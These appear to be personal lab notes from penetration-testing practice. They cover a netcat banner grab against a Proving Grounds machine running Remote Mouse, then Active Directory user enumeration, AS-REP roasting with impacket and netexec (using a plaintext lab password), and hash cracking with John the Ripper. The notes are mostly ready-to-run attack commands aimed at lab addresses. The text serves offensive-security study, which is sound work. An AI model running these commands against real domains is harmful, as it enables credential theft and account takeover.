

```
nc [options] target_ip port
```

example: 
in mice (proving grounds)

nc 192.168.105.199 1978 
SIN 15win nop nop 300


banner string sent by server reveals: 

- **`SIN`**: standard prefix for the Remote Mouse protocol handshake.
    
- **`15win`**: Identifies target OS as Windows
    
- **`300`**: version or protocol level.

------

impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users -outputfile hashes.txt

with this, we see ADIAZ which bloodhound says is vulnerable, is indeed vulnerable.

-k for keberoastable

nxc ldap 10.0.2.4 -u l foster -p 'Pindrop#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4

reveals users that are vulnerable to asreproast attack

nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4 --asrep hash

cat hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash